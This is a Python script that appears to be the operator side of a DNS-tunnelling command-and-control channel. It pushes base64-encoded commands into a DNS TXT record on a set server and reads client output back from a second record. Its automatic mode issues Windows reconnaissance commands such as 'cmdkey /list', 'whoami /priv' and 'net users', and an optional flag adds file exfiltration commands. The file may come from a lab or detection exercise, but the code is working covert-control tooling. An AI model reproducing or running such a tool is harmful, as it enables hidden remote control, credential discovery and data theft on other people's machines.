import dns.update
import dns.query
import dns.resolver
import time
import base64
import random

# if exfiltration commands will be automatically run
DO_EXFILTRATION = False

# number of commands to auto run before stopping
# set to -1 to have no limit
COMMAND_LIMIT = -1

# sleep time between checking response record
SLEEP_TIME = 1

# time to wait for response from the client
TIMEOUT = 30

# pre-decided zone and record names
ZONE = 'c2.netres.com.'
COMMAND_RECORD = 'command.c2.netres.com.'
RESPONSE_RECORD = 'response.c2.netres.com.'

# must provide the IP address of the DNS server
DNS_IP = '192.168.243.141'

SAMPLE_COMMANDS = [
        'whoami',
        'dir',
        'systeminfo',
        'hostname',
        'ipconfig /all',
        'netstat -ano',
        'arp -a',
        'route print',
        'net users',
        'tasklist /v',
        'wmic startup get caption, command',
        'sc query state= all',
        'wmic service list brief',
        'schtasks /query /fo LIST /v',
        'set',
        'echo %USERNAME%',
        'echo %USERDOMAIN%',
        'net config workstation',
        'wmic computersystem get model,name,manufacturer,systemtype',
        'wmic os get caption,version,osarchitecture',
        'whoami /all',
        'wmic logicaldisk get name,description,filesystem,freespace,size',
        'cmdkey /list',
        'whoami /priv',
        'whoami /groups'
]

if DO_EXFILTRATION:
    SAMPLE_COMMANDS.append('exfiltrate message.txt')
    SAMPLE_COMMANDS.append('exfiltrate data.zip')


# update the covert record with the next command we want the client to run
def update_record(record: str, msg: str) -> str:
    if msg != '':
        encoded_msg = base64.b64encode(msg.encode()).decode()
    else:
        encoded_msg = msg

    update = dns.update.Update(ZONE)
    update.delete(record, 'TXT')
    update.add(record, 60, 'TXT', encoded_msg)

    response = dns.query.tcp(update, DNS_IP)
    return response


def manual_control():
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [DNS_IP]

    while True:
        command = input('Enter a command: ')
        response = update_record(COMMAND_RECORD, command)

        if "SERVFAIL" in str(response):
            print('Something went wrong :(')
            continue

        print('Command set. Waiting for response...')
        start_time = time.time()
        while time.time() - start_time < TIMEOUT:
            time.sleep(SLEEP_TIME)
            client_response = resolver.resolve(RESPONSE_RECORD, 'TXT')
            full_client_text = ''
            for response in client_response:
                text_response = response.to_text().strip('"')
                full_client_text += text_response
            decoded_response = base64.b64decode(full_client_text).decode()
            
            if decoded_response != '""':  # client returned a response
                # reset the field to be empty
                print(decoded_response, '\n')
                update_record(RESPONSE_RECORD, '""')
                update_record(COMMAND_RECORD, '""')
                break
        else:  #  timeout received
            print('Response timed out from client\n')


def automatic_control():
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [DNS_IP]

    command_counter = 1

    while True:
        time.sleep(1)
        command_index = random.randint(0, len(SAMPLE_COMMANDS)-1)
        command = SAMPLE_COMMANDS[command_index]
        print(f'{command_counter}: Selected command "{command}"')
        response = update_record(COMMAND_RECORD, command)

        if "SERVFAIL" in str(response):
            print('Something went wrong :(')
            continue

        print('Command set. Waiting for response...')
        start_time = time.time()
        while time.time() - start_time < TIMEOUT:
            time.sleep(SLEEP_TIME)
            client_response = resolver.resolve(RESPONSE_RECORD, 'TXT')
            full_client_text = ''
            for response in client_response:
                text_response = response.to_text().strip('"')
                full_client_text += text_response
            decoded_response = base64.b64decode(full_client_text).decode()
            
            if decoded_response != '""':  # client returned a response
                # reset the field to be empty
                print(decoded_response, '\n')
                update_record(RESPONSE_RECORD, '""')
                update_record(COMMAND_RECORD, '""')
                break
        else:  #  timeout received
            print('Response timed out from client\n')
        
        command_counter += 1
        if COMMAND_LIMIT != -1 and command_counter > COMMAND_LIMIT:
            print(f'Command limit of {COMMAND_LIMIT} reached. Quitting...')
            break





def main():
    # manual_control()
    automatic_control()
  


if __name__ == '__main__':
    main()

